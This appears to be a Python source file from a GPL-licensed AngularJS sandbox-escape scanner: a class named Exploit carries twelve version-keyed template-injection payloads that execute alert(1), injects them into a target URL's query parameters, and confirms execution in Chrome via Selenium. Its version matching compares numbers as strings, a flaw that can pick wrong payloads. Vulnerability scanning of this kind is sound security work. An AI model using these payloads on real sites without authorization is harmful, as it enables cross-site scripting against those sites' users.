# Copyright (c) 2017 Tijme Gommers
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA

from urllib.parse import urlparse, urlencode, parse_qs, quote_plus
from urllib.request import urlopen
from bs4 import BeautifulSoup
from selenium import webdriver
from sys import platform

import copy
import os
import ctypes

"""
This class checks if certain websites are vulnerable for AngularJS sandbox escapes.
Requires 'BeatifulSoup' and 'webdriver'
    $ pip install -U beautifulsoup4
    $ pip install -U selenium
"""
class Exploit:

    """
    Keep track of the Exploit instance
    """
    _instance = None

    """
    The AngularJS payloads to test
    """
    _payloads = [
        {
            "min": "1.0.1",
            "max": "1.1.5",
            "value": "{{constructor.constructor('alert(1)')()}}"
        },
        {
            "min": "1.2.0",
            "max": "1.2.1",
            "value": "{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}"
        },
        {
            "min": "1.2.2",
            "max": "1.2.5",
            "value": "{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval(\"x='\"+(y='if(!window\\\\u002ex)alert(window\\\\u002ex=1)')+eval(y)+\"'\");}}"
        },
        {
            "min": "1.2.6",
            "max": "1.2.18",
            "value": "{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}"
        },
        {
            "min": "1.2.19",
            "max": "1.2.23",
            "value": "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(1)\"].sort(toString.constructor);}}"
        },
        {
            "min": "1.2.24",
            "max": "1.2.29",
            "value": "{{'a'.constructor.prototype.charAt=''.valueOf;$eval(\"x='\\\"+(y='if(!window\\\\u002ex)alert(window\\\\u002ex=1)')+eval(y)+\\\"'\");}}"
        },

# TODO
# Add payload for 1.3.0

        {
            "min": "1.3.1",
            "max": "1.3.2",
            "value": "{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=''.valueOf; $eval('x=alert(1)//');}}"
        },
        {
            "min": "1.3.3",
            "max": "1.3.18",
            "value": "{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}"
        },
        {
            "min": "1.3.19",
            "max": "1.3.19",
            "value": "{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)//');}}"
        },
        {
            "min": "1.3.20",
            "max": "1.3.20",
            "value": "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}"
        },
        {
            "min": "1.4.0",
            "max": "1.4.9",
            "value": "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1}}};alert(1)//');}}"
        },
        {
            "min": "1.5.0",
            "max": "1.5.8",
            "value": "{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}"
        }

# TODO
# Add payload for 1.5.9 - 1.5.11

    ]

    """
    Check if the given URL is vulnerable for an AngularJS sandbox escape for the given AngularJS version
    If use JavaScript engine is True, this class will ensure the alert is really popped using a JavaScript engine.
    """
    def is_vulnerable(self, url, version, use_javascript_engine=False):
        params = self.get_params(url)

        for param in params:
            for payload in self.get_payloads(version):
                payload_params = copy.deepcopy(params)
                del payload_params[param]
                payload_params = urlencode(payload_params, doseq=True)

                host_url = url.split('?')[0]
                full_url = host_url + "?" + payload_params

                if len(payload_params) > 0:
                    full_url = full_url + "&"

                full_urls = [
                    full_url + param + "=" + payload["value"],
                    full_url + param + "=" + quote_plus(payload["value"])
                ]

                for full_url in full_urls:
                    contents = self.get_contents(full_url)

                    if not self.is_reflected(contents, payload):
                        continue

                    if not self.in_angular_scope(contents, payload):
                        continue

                    if use_javascript_engine and not self.alert_is_popped(full_url):
                        continue

                    return full_url

        return False

    """
    Get all the query params in the given URL
    """
    def get_params(self, url):
        parsed = urlparse(url)
        return parse_qs(parsed.query)

    """
    Get all valid payloads for the given version
    """
    def get_payloads(self, version):
        requested_payloads = []

        for payload in self._payloads:
            req_major, req_minor, req_patch = version.split(".")
            min_major, min_minor, min_patch = payload["min"].split(".")
            max_major, max_minor, max_patch = payload["max"].split(".")

            if req_major > max_major or req_major < min_major:
                continue

            if req_minor > max_minor or req_minor < min_minor:
                continue

            if req_patch > max_patch or req_patch < min_patch:
                continue

            requested_payloads.append(payload)

        return requested_payloads

    """
    Get the contents of the given URL
    """
    def get_contents(self, url):
        return urlopen(url).read().decode("utf-8")

    """
    Check if the given payload was reflected in the contents
    """
    def is_reflected(self, contents, payload):
        return payload['value'] in contents

    """
    Check if the given payload is within an AngularJS scope
    """
    def in_angular_scope(self, contents, payload):
        soup = BeautifulSoup(contents, "html.parser")
        ng_app_contents = str(soup.select("[ng-app]"))

        return payload['value'] in ng_app_contents

    """
    Check if the alert is really executed. Alerts could possibly not be executed because of the ngNonBindable attribute for example
    """
    def alert_is_popped(self, url):
        chromedriver = self.get_chrome_driver()
        
        browser = webdriver.Chrome(chromedriver)
        browser.get(url)
        alert_is_popped = True

        try:
            alert = browser.switch_to_alert()
            alert.accept()
        except:
            alert_is_popped = False
        
        browser.close()
        return alert_is_popped

    """
    Get the correct Chrome driver for this OS
    """
    def get_chrome_driver(self):
        path = os.path.dirname(os.path.abspath(__file__))
        bits = ctypes.sizeof(ctypes.c_voidp)
        x = '32' if bits == 4 else '64'

        if platform == "linux" or platform == "linux2":
            return path + "/../chrome_drivers/chromedriver_linux" + x
        elif platform == "darwin":
            return path + "/../chrome_drivers/chromedriver_max64"
        elif platform == "win32":
            return path + "/../chrome_drivers/chromedriver_win32"

    """
    Get the Exploit instance
    """
    def get_instance():
        if Exploit._instance == None:
            Exploit._instance = Exploit()

        return Exploit._instance

    get_instance = staticmethod(get_instance)